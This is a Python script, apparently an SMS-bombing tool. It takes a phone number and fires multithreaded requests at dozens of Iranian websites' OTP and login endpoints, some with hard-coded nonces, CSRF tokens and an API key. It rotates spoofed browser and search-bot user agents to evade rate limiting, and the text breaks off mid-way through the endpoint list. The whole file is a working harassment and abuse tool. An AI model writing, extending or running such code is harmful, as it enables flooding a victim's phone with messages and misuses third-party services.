import requests
import threading
import time
import random
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import urllib3
import socket

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

THREAD_COUNT = 35
BASE_DELAY = 0.15
MAX_RETRIES = 2
TIMEOUT = 8
REQUESTS_PER_API = 10

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A536E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A336E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 22101316G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; OnePlus 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; LIO-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; ELS-AN00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-T970) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-X800) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 14526.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 (compatible; AdsBot-Google)",
]

class ErrorManager:
    def __init__(self):
        self.stats = defaultdict(int)
        self.error_details = defaultdict(list)
        self.success_count = 0
        self.fail_count = 0
    
    def add_error(self, api_name, error_code, message=""):
        self.stats[error_code] += 1
        self.error_details[error_code].append(f"{api_name}: {message[:50]}")
    
    def add_success(self):
        self.success_count += 1
    
    def add_fail(self):
        self.fail_count += 1
    
    def print_report(self):
        print("\n" + "=" * 70)
        print("📊 گزارش کامل خطاها:")
        print(f"   ✅ موفق: {self.success_count}")
        print(f"   ❌ ناموفق: {self.fail_count}")
        print("-" * 40)
        
        error_types = {
            200: "OK", 201: "Created", 202: "Accepted", 204: "No Content",
            301: "Moved Permanently", 302: "Found", 304: "Not Modified",
            400: "Bad Request", 401: "Unauthorized", 403: "Forbidden",
            404: "Not Found", 405: "Method Not Allowed", 406: "Not Acceptable",
            408: "Request Timeout", 409: "Conflict", 410: "Gone",
            411: "Length Required", 412: "Precondition Failed", 413: "Payload Too Large",
            414: "URI Too Long", 415: "Unsupported Media Type", 416: "Range Not Satisfiable",
            417: "Expectation Failed", 418: "I'm a teapot", 419: "Authentication Timeout",
            422: "Unprocessable Entity", 423: "Locked", 424: "Failed Dependency",
            425: "Too Early", 426: "Upgrade Required", 428: "Precondition Required",
            429: "Too Many Requests", 431: "Request Header Fields Too Large",
            451: "Unavailable For Legal Reasons", 500: "Internal Server Error",
            501: "Not Implemented", 502: "Bad Gateway", 503: "Service Unavailable",
            504: "Gateway Timeout", 505: "HTTP Version Not Supported",
            506: "Variant Also Negotiates", 507: "Insufficient Storage",
            508: "Loop Detected", 510: "Not Extended", 511: "Network Authentication Required",
            520: "Web Server Returned an Unknown Error", 521: "Web Server Is Down",
            522: "Connection Timed Out", 523: "Origin Is Unreachable",
            524: "A Timeout Occurred", 525: "SSL Handshake Failed",
            526: "Invalid SSL Certificate", 527: "Railgun Listener to Origin Error",
            530: "Site Is Frozen", 598: "Network Read Timeout Error",
            599: "Network Connect Timeout Error", 999: "Unknown Error"
        }
        
        for code, count in self.stats.items():
            if count > 0:
                error_name = error_types.get(code, f"Error {code}")
                print(f"   {error_name} ({code}): {count}")
        
        print("=" * 70)

error_manager = ErrorManager()

def get_all_apis(phone):
    phone_without_zero = phone[1:] if phone.startswith('0') else phone
    phone_with_code = f"+98{phone_without_zero}"
    
    apis = [
        {
            'name': 'Parasteh',
            'url': 'https://parasteh.com/wp/wp-admin/admin-ajax.php',
            'method': 'POST',
            'data': f'action=rml_operation&nonce=7f3b31c07d&data%5B0%5D%5Bname%5D=rml-login-type&data%5B0%5D%5Bvalue%5D=mobile&data%5B1%5D%5Bname%5D=login-mobile&data%5B1%5D%5Bvalue%5D={phone}&data%5B2%5D%5Bname%5D=rml-mobile-dial-code&data%5B2%5D%5Bvalue%5D=98&data%5B3%5D%5Bname%5D=rml-mobile-country-code&data%5B3%5D%5Bvalue%5D=ir&data%5B4%5D%5Bname%5D=rml-operation&data%5B4%5D%5Bvalue%5D=login&data%5B5%5D%5Bname%5D=rml-redirect&data%5B5%5D%5Bvalue%5D=',
            'type': 'form',
            'headers': {
                'Origin': 'https://parasteh.com',
                'Referer': 'https://parasteh.com/',
            }
        },
        
        {
            'name': 'ZarShop',
            'url': 'https://zar-shop.com/api/v1/sessions/login_request',
            'method': 'POST',
            'data': json.dumps({"mobile_phone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://zar-shop.com',
                'Referer': 'https://zar-shop.com/',
            }
        },
        
        {
            'name': 'DioraGallery',
            'url': 'https://dioragallery.com/index.php',
            'method': 'POST',
            'data': f'username=&password=&username_c={phone}&code=&z24LoginMobileSubmit=OK&action=login-2&return=aHR0cHM6Ly9kaW9yYWdhbGxlcnkuY29tLw%3D%3D&urlreturn=https%3A%2F%2Fdioragallery.com%2F&8805c45799c7e0e03937c32d6ceb87c2=1',
            'type': 'form',
            'headers': {
                'Origin': 'https://dioragallery.com',
                'Referer': 'https://dioragallery.com/',
            }
        },
        
        {
            'name': 'Talapp',
            'url': 'https://market.talapp.ir/api/register',
            'method': 'POST',
            'data': json.dumps({
                "device_id": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36",
                "model": "web",
                "phone": phone,
                "password": "Soheil83"
            }),
            'type': 'json',
            'headers': {
                'Origin': 'https://market.talapp.ir',
                'Referer': 'https://market.talapp.ir/',
            }
        },
        
        {
            'name': 'Goldbaan',
            'url': 'https://api.goldbaan.ir/api/auth/check',
            'method': 'POST',
            'data': json.dumps({"phone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://goldbaan.ir',
                'Referer': 'https://goldbaan.ir/',
            },
            'delay': 1.0
        },
        
        {
            'name': 'MilliGold',
            'url': 'https://milli.gold/api/v1/public/otp',
            'method': 'POST',
            'data': json.dumps({"mobileNumber": phone_with_code, "operation": "REGISTER_USER"}),
            'type': 'json',
            'headers': {
                'Origin': 'https://milli.gold',
                'Referer': 'https://milli.gold/',
            }
        },
        
        {
            'name': 'MelliGold',
            'url': 'https://melligold.com/api/v1/authentication/login-register/',
            'method': 'POST',
            'data': json.dumps({"mobile": phone_with_code}),
            'type': 'json',
            'headers': {
                'Origin': 'https://melligold.com',
                'Referer': 'https://melligold.com/',
            }
        },
        
        {
            'name': 'Talasea',
            'url': 'https://api.talasea.ir/api/auth/sentOTP',
            'method': 'POST',
            'data': json.dumps({"phoneNumber": phone_with_code}),
            'type': 'json',
            'headers': {
                'Origin': 'https://talasea.ir',
                'Referer': 'https://talasea.ir/',
            }
        },
        
        {
            'name': 'Komodaa',
            'url': 'https://api.komodaa.com/api/v2.6/loginRC/request',
            'method': 'POST',
            'data': json.dumps({"phone_number": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://komodaa.com',
                'Referer': 'https://komodaa.com/',
            },
            'delay': 1.0
        },
        
        {
            'name': 'Padmira',
            'url': 'https://padmira.ir/ajax/send_sms_active',
            'method': 'POST',
            'data': f'mobile={phone}',
            'type': 'form',
            'headers': {
                'Origin': 'https://padmira.ir',
                'Referer': 'https://padmira.ir/',
            }
        },
        
        {
            'name': 'Parsimezon',
            'url': 'https://parsimezon.ir/wp-admin/admin-ajax.php',
            'method': 'POST',
            'data': f'action=digits_check_mob&countrycode=%2B98&mobileNo={phone}&csrf=93fe116779&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0',
            'type': 'form',
            'headers': {
                'Origin': 'https://parsimezon.ir',
                'Referer': 'https://parsimezon.ir/',
            }
        },
        
        {
            'name': 'Aysoo',
            'url': 'https://aysoocollection.com/sendcode',
            'method': 'POST',
            'data': json.dumps({"mobile": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://aysoocollection.com',
                'Referer': 'https://aysoocollection.com/',
            }
        },
        
        {
            'name': 'Newshin',
            'url': 'https://newshin.ir/wp-admin/admin-ajax.php',
            'method': 'POST',
            'data': f'action=digits_check_mob&countrycode=%2B98&mobileNo={phone_without_zero}&csrf=477bb8cc2e&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=917+533+3546&dig_otp=&dig_nounce=477bb8cc2e&digits_redirect_page=-1',
            'type': 'form',
            'headers': {
                'Origin': 'https://newshin.ir',
                'Referer': 'https://newshin.ir/',
            }
        },
        
        {
            'name': 'SmartizGallery',
            'url': 'https://smartizgallery.ir/ajax/send_sms_active',
            'method': 'POST',
            'data': f'mobile={phone}',
            'type': 'form',
            'headers': {
                'Origin': 'https://smartizgallery.ir',
                'Referer': 'https://smartizgallery.ir/',
            }
        },
        
        {
            'name': 'Snapp V1',
            'url': 'https://api.snapp.ir/api/v1/sms/link',
            'method': 'POST',
            'data': json.dumps({"phone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://snapp.ir',
                'Referer': 'https://snapp.ir/',
            }
        },
        
        {
            'name': 'Snapp V2',
            'url': 'https://digitalsignup.snapp.ir/ds3/api/v3/otp',
            'method': 'POST',
            'data': json.dumps({"cellphone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://snapp.ir',
                'Referer': 'https://snapp.ir/',
            }
        },
        
        {
            'name': 'Achareh',
            'url': 'https://api.achareh.co/v2/accounts/login/',
            'method': 'POST',
            'data': json.dumps({"phone": f"98{phone_without_zero}"}),
            'type': 'json',
            'headers': {
                'Origin': 'https://achareh.ir',
                'Referer': 'https://achareh.ir/',
            },
            'delay': 1.0
        },
        
        {
            'name': 'Zigap',
            'url': 'https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp',
            'method': 'POST',
            'data': json.dumps({"phoneNumber": phone_with_code}),
            'type': 'json',
            'headers': {
                'Origin': 'https://zigap.ir',
                'Referer': 'https://zigap.ir/',
            }
        },
        
        {
            'name': 'Jabama',
            'url': 'https://gw.jabama.com/api/v4/account/send-code',
            'method': 'POST',
            'data': json.dumps({"mobile": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://jabama.com',
                'Referer': 'https://jabama.com/',
            }
        },
        
        {
            'name': 'Banimode',
            'url': 'https://mobapi.banimode.com/api/v2/auth/request',
            'method': 'POST',
            'data': json.dumps({"phone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://www.banimode.com',
                'Referer': 'https://www.banimode.com/',
                'Platform': 'WEB',
            }
        },
        
        {
            'name': 'Classino',
            'url': 'https://student.classino.com/otp/v1/api/login',
            'method': 'POST',
            'data': json.dumps({"mobile": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://classino.com',
                'Referer': 'https://classino.com/',
            }
        },
        
        {
            'name': 'Digikala',
            'url': 'https://api.digikala.com/v1/user/authenticate/',
            'method': 'POST',
            'data': json.dumps({"username": phone, "otp_call": False}),
            'type': 'json',
            'headers': {
                'Origin': 'https://www.digikala.com',
                'Referer': 'https://www.digikala.com/',
            }
        },
        
        {
            'name': 'Alibaba',
            'url': 'https://ws.alibaba.ir/api/v3/account/mobile/otp',
            'method': 'POST',
            'data': json.dumps({"phoneNumber": phone_without_zero}),
            'type': 'json',
            'headers': {
                'Origin': 'https://www.alibaba.ir',
                'Referer': 'https://www.alibaba.ir/',
                'ab-channel': 'WEB',
            }
        },
        
        {
            'name': 'Divar',
            'url': 'https://api.divar.ir/v5/auth/authenticate',
            'method': 'POST',
            'data': json.dumps({"phone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://divar.ir',
                'Referer': 'https://divar.ir/',
                'x-api-key': '807a9c8e-5450-4cfa-9e77-ee5b1e8d053d',
            },
            'delay': 0.8
        },
        
        {
            'name': 'Sheypoor',
            'url': 'https://www.sheypoor.com/api/v10.0.0/auth/send',
            'method': 'POST',
            'data': json.dumps({"username": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://www.sheypoor.com',
                'Referer': 'https://www.sheypoor.com/',
            },
            'delay': 1.2
        },
        
        {
            'name': 'Tapsi',
            'url': 'https://api.tapsi.ir/api/v2.2/user',
            'method': 'POST',
            'data': json.dumps({
                "credential": {"phoneNumber": phone, "role": "PASSENGER"},
                "otpOption": "SMS"
            }),
            'type': 'json',
            'headers': {
                'Origin': 'https://app.tapsi.ir',
                'Referer': 'https://app.tapsi.ir/',
            }
        },
        
        {
            'name': 'GapFilm',
            'url': 'https://core.gapfilm.ir/api/v3.1/Account/Login',
            'method': 'POST',
            'data': json.dumps({"Type": "3", "Username": phone_without_zero}),
            'type': 'json',
            'headers': {
                'Origin': 'https://www.gapfilm.ir',
                'Referer': 'https://www.gapfilm.ir/',
            }
        },
        
        {
            'name': 'IToll',
            'url': 'https://app.itoll.com/api/v1/auth/login',
            'method': 'POST',
            'data': json.dumps({"mobile": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://itoll.ir',
                'Referer': 'https://itoll.ir/',
            }
        },
        
        {
            'name': 'Lendo',
            'url': 'https://api.lendo.ir/api/customer/auth/send-otp',
            'method': 'POST',
            'data': json.dumps({"mobile": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://lendo.ir',
                'Referer': 'https://lendo.ir/',
            },
            'delay': 0.8
        },
        
        {
            'name': 'Lendo Confirm',
            'url': 'https://lendo.ir/confirmCode',
            'method': 'GET',
            'data': {
                'mobile': phone,
                'return': '/user',
                'register': '1'
            },
            'type': 'form',
            'headers': {
                'Origin': 'https://lendo.ir',
                'Referer': 'https://lendo.ir/',
            }
        },
        
        {
            'name': 'Namava',
            'url': 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request',
            'method': 'POST',
            'data': json.dumps({"UserName": phone_with_code}),
            'type': 'json',
            'headers': {
                'Origin': 'https://www.namava.ir',
                'Referer': 'https://www.namava.ir/',
            },
            'delay': 1.0
        },
        
        {
            'name': 'Bitpin',
            'url': 'https://api.bitpin.ir/v1/usr/sub_phone/',
            'method': 'POST',
            'data': json.dumps({"phone": phone, "captcha_token": ""}),
            'type': 'json',
            'headers': {
                'Origin': 'https://bitpin.ir',
                'Referer': 'https://bitpin.ir/',
            }
        },
        
        {
            'name': 'Taaghche',
            'url': 'https://gw.taaghche.com/v4/site/auth/signup',
            'method': 'POST',
            'data': json.dumps({"contact": phone_with_code}),
            'type': 'json',
            'headers': {
                'Origin': 'https://taaghche.com',
                'Referer': 'https://taaghche.com/',
            }
        },
        
        {
            'name': 'Behtarino',
            'url': 'https://bck.behtarino.com/api/v1/users/phone_verification/',
            'method': 'POST',
            'data': json.dumps({"phone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://behtarino.com',
                'Referer': 'https://behtarino.com/',
            }
        },
        
        {
            'name': '3tex',
            'url': 'https://3tex.io/api/1/users/validation/mobile',
            'method': 'POST',
            'data': json.dumps({"receptorPhone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://3tex.io',
                'Referer': 'https://3tex.io/register',
            }
        },
        
        {
            'name': 'Deniizshop',
            'url': 'https://deniizshop.com/api/v1/sessions/login_request',
            'method': 'POST',
            'data': json.dumps({"mobile_phone": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://deniizshop.com',
                'Referer': 'https://deniizshop.com/',
            }
        },
        
        {
            'name': 'Flightio',
            'url': 'https://flightio.com/bff/Authentication/CheckUserKey',
            'method': 'POST',
            'data': json.dumps({
                "userKey": f"98-{phone_without_zero}",
                "userKeyType": 1
            }),
            'type': 'json',
            'headers': {
                'Origin': 'https://flightio.com',
                'Referer': 'https://flightio.com/',
                'f-lang': 'fa',
            },
            'delay': 0.8
        },
        
        {
            'name': 'Pooleno',
            'url': 'https://api.pooleno.ir/v1/auth/check-mobile',
            'method': 'POST',
            'data': json.dumps({"mobile": phone}),
            'type': 'json',
            'headers': {
                'Origin': 'https://pooleno.ir',
                'Referer': 'https://pooleno.ir/',
            }
        },
        
        {
            'name': 'Shad',
            'url': 'https://shadmessenger12.iranlms.ir/',
            'method': 'POST',
            'data': json.dumps({
                "api_version": "3",
                "method": "sendCode",
                "data": {"phone_number": phone_without_zero, "send_type": "SMS"}
            }),
            'type': 'json',
            'headers': {
                'Origin': 'https://shadweb.iranlms.ir',
                'Referer': 'https://shadweb.iranlms.ir/',
            }
        },
        
        {
            'name': 'Rubika',
            'url': 'https://messengerg2c4.iranlms.ir/',
            'method': 'POST',
            'data': json.dumps({
                "api_version": "3",
                "method": "sendCode",
                "data": {"phone_number": phone_without_zero, "send_type": "SMS"}
            }),
            'type': 'json',
            'headers': {
                'Origin': 'https://web.rubika.ir',
                'Referer': 'https://web.rubika.ir/',
            }
        },
        
        {
            'name': 'Bama',
            'url': 'https://bama.ir/signin-checkforcellnumber',
